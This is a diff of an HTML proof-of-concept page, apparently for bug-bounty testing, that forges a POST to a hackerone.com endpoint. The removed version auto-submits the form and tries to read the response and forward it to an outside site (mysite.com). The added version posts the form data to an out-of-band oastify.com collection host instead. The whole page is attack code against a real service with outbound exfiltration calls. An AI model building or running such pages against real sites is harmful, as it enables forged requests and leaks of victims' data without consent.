@@ -1,44 +1,44 @@
 <html>
   <body>
-    <form id="submissionForm" action="https://hackerone.com/stories-of-2024/new" method="POST">
+    <form id="myForm" method="POST" action="https://hackerone.com/stories-of-2024/new">
       <input type="submit" value="Submit request" />
     </form>
 
     <script>
-      // Override the form submission to prevent the default behavior
-      document.getElementById('submissionForm').onsubmit = function(event) {
-        event.preventDefault();  // Prevent the form from submitting normally
+      // Intercept the form submission to capture the response
+      document.getElementById("myForm").onsubmit = function(event) {
+        event.preventDefault();  // Prevent the form from submitting the usual way
 
-        // Send the request using fetch
-        fetch('https://hackerone.com/stories-of-2024/new', {
-          method: 'POST',
-          body: new FormData(this)  // Send the form data
+        // Create a FormData object to gather the form data
+        const formData = new FormData(document.getElementById("myForm"));
+
+        // Send the form data using fetch with a fully qualified URL
+        fetch("https://kk8v4feiqhuiqei54ntyx1o30u6luhi6.oastify.com", {
+          method: "POST",
+          body: formData,
         })
-        .then(response => response.text())  // Assuming the response is text
-        .then(data => {
-          // Now, send the received data to the new URL
-          fetch('https://mysite.com/confirmed/submissions', {
-            method: 'POST',
-            body: JSON.stringify({ response: data }),  // Assuming you want to send the response data as JSON
-            headers: {
-              'Content-Type': 'application/json'  // Set the proper header for JSON
-            }
-          })
-          .then(confirmResponse => {
-            // Handle confirmation response if needed
-            console.log('Response confirmed');
-          })
-          .catch(error => {
-            console.error('Error confirming submission:', error);
-          });
+        .then((response) => {
+          if (!response.ok) {
+            // Handle any HTTP errors (e.g., 404, 500)
+            throw new Error("Network response was not ok");
+          }
+          return response.json();  // Parse the response as JSON (adjust based on your server's response format)
         })
-        .catch(error => {
-          console.error('Error in submission request:', error);
+        .then((data) => {
+          // Capture and process the response data
+          console.log("Response data:", data);
+
+          // Now you can use the response data in further logic
+          // For example, you can use it to send a request to another endpoint
+        })
+        .catch((error) => {
+          // Handle any errors during the fetch request
+          console.error("There was a problem with the fetch operation:", error);
         });
       };
 
-      // Trigger form submission programmatically
-      document.getElementById('submissionForm').submit();
+      // Optionally, trigger the form submission automatically (you can remove this if not needed)
+      // document.forms[0].submit();  // This will trigger the submit event and initiate the fetch logic
     </script>
   </body>
 </html>
